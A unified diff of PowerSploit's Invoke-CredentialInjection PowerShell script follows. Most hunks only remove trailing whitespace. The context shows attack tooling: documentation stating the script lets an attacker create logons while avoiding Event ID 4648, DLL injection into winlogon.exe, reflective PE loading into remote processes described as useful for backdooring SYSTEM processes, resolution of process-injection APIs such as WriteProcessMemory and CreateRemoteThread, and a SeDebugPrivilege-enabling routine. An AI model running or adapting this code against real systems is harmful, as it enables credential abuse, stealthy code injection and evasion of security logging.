@@ -4,8 +4,8 @@ function Invoke-CredentialInjection
     .SYNOPSIS
 
     This script allows an attacker to create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon).
-    The script either creates a suspended winlogon.exe process running as SYSTEM, or uses an existing WinLogon process. Then, it injects a DLL in to 
-    winlogon.exe which calls LsaLogonUser to create a logon from within winlogon.exe (which is where it is called from when a user logs in using RDP or 
+    The script either creates a suspended winlogon.exe process running as SYSTEM, or uses an existing WinLogon process. Then, it injects a DLL in to
+    winlogon.exe which calls LsaLogonUser to create a logon from within winlogon.exe (which is where it is called from when a user logs in using RDP or
     logs on locally). The injected DLL then impersonates the new logon token with its current thread so that it can be kidnapped using Invoke-TokenManipulation.
 
     PowerSploit Function: Invoke-CredentialInjection
@@ -18,13 +18,13 @@ function Invoke-CredentialInjection
     .DESCRIPTION
 
     This script allows an attacker to create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon).
-    The script either creates a suspended winlogon.exe process running as SYSTEM, or uses an existing WinLogon process. Then, it injects a DLL in to 
-    winlogon.exe which calls LsaLogonUser to create a logon from within winlogon.exe (which is where it is called from when a user logs in using RDP or 
+    The script either creates a suspended winlogon.exe process running as SYSTEM, or uses an existing WinLogon process. Then, it injects a DLL in to
+    winlogon.exe which calls LsaLogonUser to create a logon from within winlogon.exe (which is where it is called from when a user logs in using RDP or
     logs on locally). The injected DLL then impersonates the new logon token with its current thread so that it can be kidnapped using Invoke-TokenManipulation.
 
     .PARAMETER NewWinLogon
 
-    Switch. Specifies that this script should create a new WinLogon.exe process. This may be suspicious, as log correlation can show winlogon.exe was 
+    Switch. Specifies that this script should create a new WinLogon.exe process. This may be suspicious, as log correlation can show winlogon.exe was
     created by PowerShell.exe. This CANNOT be used if the script is run from Session 0 (winlogon requires a desktop is available, and session 0 doesn't have one).
 
     .PARAMETER ExistingWinLogon
@@ -51,7 +51,7 @@ function Invoke-CredentialInjection
 
     The authentication package to use. Default is Kerberos. Msv1_0 can be specified but should only be used for local accounts (which can't use kerberos).
 
-	
+
     .EXAMPLE
 
     Invoke-CredentialInjection -DomainName "demo" -UserName "administrator" -Password "Password1" -NewWinLogon
@@ -70,7 +70,7 @@ function Invoke-CredentialInjection
 
     Invoke-CredentialInjection -DomainName "demo" -UserName "administrator" -Password "Password1" -NewWinLogon -AuthPackage Msv1_0
 
-    Creates a new winlogon process (as the SYSTEM account) and creates a logon from within the process as demo\administrator. The logon will default to 
+    Creates a new winlogon process (as the SYSTEM account) and creates a logon from within the process as demo\administrator. The logon will default to
     RemoteInteractive (and RDP logon). The logon will use the Msv1_0 auth package (NTLM).
 
     .NOTES
@@ -131,8 +131,8 @@ function Invoke-CredentialInjection
     <#
     .SYNOPSIS
 
-    This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, 
-    or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
+    This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process,
+    or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints,
     please lead the Notes section (GENERAL NOTES) for information on how to use them.
 
 
@@ -147,8 +147,8 @@ function Invoke-CredentialInjection
     As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.
 
     This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
-    from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the 
-    remote process. 
+    from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the
+    remote process.
 
 
     While this script provides functionality to specify a file to load from disk or from a URL, these are more for demo purposes. The way I'd recommend using the script is to create a byte array
@@ -184,11 +184,11 @@ function Invoke-CredentialInjection
     Optional, the return type of the function being called in the DLL. Default: Void
 	    Options: String, WString, Void. See notes for more information.
 	    IMPORTANT: For DLLs being loaded remotely, only Void is supported.
-	
+
     .PARAMETER ExeArgs
 
     Optional, arguments to pass to the executable being reflectively loaded.
-	
+
     .PARAMETER ProcName
 
     Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.
@@ -196,7 +196,7 @@ function Invoke-CredentialInjection
     .PARAMETER ProcId
 
     Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.
-	
+
     .EXAMPLE
 
     Load DemoDLL from a URL and run the exported function WStringFunc on the current system, print the wchar_t* returned by WStringFunc().
@@ -295,28 +295,28 @@ function Invoke-CredentialInjection
 	    [Parameter(Mandatory = $true)]
 	    [Byte[]]
 	    $Bytes32,
-	
+
 	    [Parameter(Mandatory = $true)]
 	    [Byte[]]
 	    $Bytes64,
-	
+
 	    [Parameter(Position = 1)]
 	    [String[]]
 	    $ComputerName,
-	
+
 	    [Parameter(Position = 2)]
         [ValidateSet( 'WString', 'String', 'Void' )]
 	    [String]
 	    $FuncReturnType = 'Void',
-	
+
 	    [Parameter(Position = 3)]
 	    [String]
 	    $ExeArgs,
-	
+
 	    [Parameter(Position = 4)]
 	    [Int32]
 	    $ProcId,
-	
+
 	    [Parameter(Position = 5)]
 	    [String]
 	    $ProcName
@@ -331,20 +331,20 @@ function Invoke-CredentialInjection
 		    [Parameter(Position = 0, Mandatory = $true)]
 		    [Byte[]]
 		    $PEBytes,
-		
+
 		    [Parameter(Position = 1, Mandatory = $false)]
 		    [String]
 		    $FuncReturnType,
-				
+
 		    [Parameter(Position = 2, Mandatory = $false)]
 		    [Int32]
 		    $ProcId,
-		
+
 		    [Parameter(Position = 3, Mandatory = $false)]
 		    [String]
 		    $ProcName
 	    )
-	
+
 	    ###################################
 	    ##########  Win32 Stuff  ##########
 	    ###################################
@@ -545,7 +545,7 @@ function Invoke-CredentialInjection
 		    $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
 		    $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
 		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
-		
+
 		    #Struct IMAGE_NT_HEADERS32
 		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
@@ -588,7 +588,7 @@ function Invoke-CredentialInjection
 		    $e_res2Field.SetCustomAttribute($AttribBuilder)
 
 		    $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
-		    $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
+		    $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
 		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER
 
 		    #Struct IMAGE_SECTION_HEADER
@@ -647,7 +647,7 @@ function Invoke-CredentialInjection
 		    $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
 		    $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
 		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
-		
+
 		    #Struct LUID
 		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		    $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
@@ -655,7 +655,7 @@ function Invoke-CredentialInjection
 		    $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
 		    $LUID = $TypeBuilder.CreateType()
 		    $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
-		
+
 		    #Struct LUID_AND_ATTRIBUTES
 		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		    $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
@@ -663,7 +663,7 @@ function Invoke-CredentialInjection
 		    $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
 		    $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
 		    $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
-		
+
 		    #Struct TOKEN_PRIVILEGES
 		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		    $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
@@ -678,7 +678,7 @@ function Invoke-CredentialInjection
 	    Function Get-Win32Constants
 	    {
 		    $Win32Constants = New-Object System.Object
-		
+
 		    $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
 		    $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
 		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
@@ -708,149 +708,149 @@ function Invoke-CredentialInjection
 		    $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
 		    $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
 		    $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
-		
+
 		    return $Win32Constants
 	    }
 
 	    Function Get-Win32Functions
 	    {
 		    $Win32Functions = New-Object System.Object
-		
+
 		    $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
 		    $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
 		    $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
 		    $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
-		
+
 		    $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
 		    $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
 		    $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
 		    $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
-		
+
 		    $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
 		    $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
 		    $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
-		
+
 		    $memsetAddr = Get-ProcAddress msvcrt.dll memset
 		    $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
 		    $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
-		
+
 		    $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
 		    $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
 		    $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
-		
+
 		    $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
 		    $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
 		    $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
-		
+
 		    $GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
 		    $GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
 		    $GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
-		
+
 		    $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
 		    $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
 		    $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
 		    $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
-		
+
 		    $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
 		    $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
 		    $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
 		    $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
-		
+
 		    $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
 		    $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
 		    $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
 		    $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
-		
+
 		    $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
 		    $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
 		    $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
 		    $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
-		
+
 		    $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
 		    $FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
 		    $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
-		
+
 		    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
 	        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
 	        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
-		
+
 		    $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
 	        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
 	        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
-		
+
 		    $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
             $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
             $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
-		
+
 		    $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
             $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
             $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
-		
+
 		    $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
             $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
             $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
-		
+
 		    $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
             $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
             $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
-		
+
 		    $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
             $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
             $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
-		
+
 		    $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
             $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
             $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
-		
+
 		    $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
             $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
             $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
-		
+
 		    $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
             $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
             $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
-		
+
 		    $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
             $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
             $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
-		
+
 		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
             $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
             $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
-		
+
 		    $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
             $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
             $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
-		
+
 		    $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
             $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
             $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
 		    $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
-		
+
 		    return $Win32Functions
 	    }
 	    #####################################
 
-			
+
 	    #####################################
 	    ###########    HELPERS   ############
 	    #####################################
@@ -863,12 +863,12 @@ function Invoke-CredentialInjection
 		    [Parameter(Position = 0, Mandatory = $true)]
 		    [Int64]
 		    $Value1,
-		
+
 		    [Parameter(Position = 1, Mandatory = $true)]
 		    [Int64]
 		    $Value2
 		    )
-		
+
 		    [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
 		    [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
 		    [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
@@ -889,8 +889,8 @@ function Invoke-CredentialInjection
 				    {
 					    $CarryOver = 0
 				    }
-				
-				
+
+
 				    [UInt16]$Sum = $Val - $Value2Bytes[$i]
 
 				    $FinalBytes[$i] = $Sum -band 0x00FF
@@ -900,10 +900,10 @@ function Invoke-CredentialInjection
 		    {
 			    Throw "Cannot subtract bytearrays of different sizes"
 		    }
-		
+
 		    return [BitConverter]::ToInt64($FinalBytes, 0)
 	    }
-	
+
 
 	    Function Add-SignedIntAsUnsigned
 	    {
@@ -911,12 +911,12 @@ function Invoke-CredentialInjection
 		    [Parameter(Position = 0, Mandatory = $true)]
 		    [Int64]
 		    $Value1,
-		
+
 		    [Parameter(Position = 1, Mandatory = $true)]
 		    [Int64]
 		    $Value2
 		    )
-		
+
 		    [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
 		    [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
 		    [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
@@ -930,7 +930,7 @@ function Invoke-CredentialInjection
 				    [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver
 
 				    $FinalBytes[$i] = $Sum -band 0x00FF
-				
+
 				    if (($Sum -band 0xFF00) -eq 0x100)
 				    {
 					    $CarryOver = 1
@@ -945,10 +945,10 @@ function Invoke-CredentialInjection
 		    {
 			    Throw "Cannot add bytearrays of different sizes"
 		    }
-		
+
 		    return [BitConverter]::ToInt64($FinalBytes, 0)
 	    }
-	
+
 
 	    Function Compare-Val1GreaterThanVal2AsUInt
 	    {
@@ -956,12 +956,12 @@ function Invoke-CredentialInjection
 		    [Parameter(Position = 0, Mandatory = $true)]
 		    [Int64]
 		    $Value1,
-		
+
 		    [Parameter(Position = 1, Mandatory = $true)]
 		    [Int64]
 		    $Value2
 		    )
-		
+
 		    [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
 		    [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
 
@@ -983,10 +983,10 @@ function Invoke-CredentialInjection
 		    {
 			    Throw "Cannot compare byte arrays of different size"
 		    }
-		
+
 		    return $false
 	    }
-	
+
 
 	    Function Convert-UIntToInt
 	    {
@@ -995,36 +995,36 @@ function Invoke-CredentialInjection
 		    [UInt64]
 		    $Value
 		    )
-		
+
 		    [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
 		    return ([BitConverter]::ToInt64($ValueBytes, 0))
 	    }
-	
-	
+
+
 	    Function Test-MemoryRangeValid
 	    {
 		    Param(
 		    [Parameter(Position = 0, Mandatory = $true)]
 		    [String]
 		    $DebugString,
-		
+
 		    [Parameter(Position = 1, Mandatory = $true)]
 		    [System.Object]
 		    $PEInfo,
-		
+
 		    [Parameter(Position = 2, Mandatory = $true)]
 		    [IntPtr]
 		    $StartAddress,
-		
+
 		    [Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
 		    [IntPtr]
 		    $EndAddress,
-		
+
 		    [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
 		    [IntPtr]
 		    $Size
 		    )
-		
+
 		    [IntPtr]$FinalEndAddress = [IntPtr]::Zero
 		    if ($PsCmdlet.ParameterSetName -eq "Size")
 		    {
@@ -1034,9 +1034,9 @@ function Invoke-CredentialInjection
 		    {
 			    $FinalEndAddress = $EndAddress
 		    }
-		
+
 		    $PEEndAddress = $PEInfo.EndAddress
-		
+
 		    if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
 		    {
 			    Throw "Trying to write to memory smaller than allocated address range. $DebugString"
@@ -1046,26 +1046,26 @@ function Invoke-CredentialInjection
 			    Throw "Trying to write to memory greater than allocated address range. $DebugString"
 		    }
 	    }
-	
-	
+
+
 	    Function Write-BytesToMemory
 	    {
 		    Param(
 			    [Parameter(Position=0, Mandatory = $true)]
 			    [Byte[]]
 			    $Bytes,
-			
+
 			    [Parameter(Position=1, Mandatory = $true)]
 			    [IntPtr]
 			    $MemoryAddress
 		    )
-	
+
 		    for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
 		    {
 			    [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
 		    }
 	    }
-	
+
 
 	    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
 	    Function Get-DelegateType
@@ -1073,11 +1073,11 @@ function Invoke-CredentialInjection
 	        Param
 	        (
 	            [OutputType([Type])]
-	        
+
 	            [Parameter( Position = 0)]
 	            [Type[]]
 	            $Parameters = (New-Object Type[](0)),
-	        
+
 	            [Parameter( Position = 1 )]
 	            [Type]
 	            $ReturnType = [Void]
@@ -1092,7 +1092,7 @@ function Invoke-CredentialInjection
 	        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
 	        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
 	        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
-	    
+
 	        Write-Output $TypeBuilder.CreateType()
 	    }
 
@@ -1103,11 +1103,11 @@ function Invoke-CredentialInjection
 	        Param
 	        (
 	            [OutputType([IntPtr])]
-	    
+
 	            [Parameter( Position = 0, Mandatory = $True )]
 	            [String]
 	            $Module,
-	        
+
 	            [Parameter( Position = 1, Mandatory = $True )]
 	            [String]
 	            $Procedure
@@ -1128,30 +1128,30 @@ function Invoke-CredentialInjection
 	        # Return the address of the function
 	        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
 	    }
-	
-	
+
+
 	    Function Enable-SeDebugPrivilege
 	    {
 		    Param(
 		    [Parameter(Position = 1, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Functions,
-		
+
 		    [Parameter(Position = 2, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Types,
-		
+
 		    [Parameter(Position = 3, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Constants
 		    )
-		
+
 		    [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
 		    if ($ThreadHandle -eq [IntPtr]::Zero)
 		    {
 			    Throw "Unable to get the handle to the current thread"
 		    }
-		
+
 		    [IntPtr]$ThreadToken = [IntPtr]::Zero
 		    [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
 		    if ($Result -eq $false)
@@ -1164,7 +1164,7 @@ function Invoke-CredentialInjection
 				    {
 					    Throw "Unable to impersonate self"
 				    }
-				
+
 				    $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
 				    if ($Result -eq $false)
 				    {
@@ -1176,7 +1176,7 @@ function Invoke-CredentialInjection
 				    Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
 			    }
 		    }
-		
+
 		    [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
 		    $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
 		    if ($Result -eq $false)
@@ -1198,33 +1198,33 @@ function Invoke-CredentialInjection
 		    {
 			    #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
 		    }
-		
+
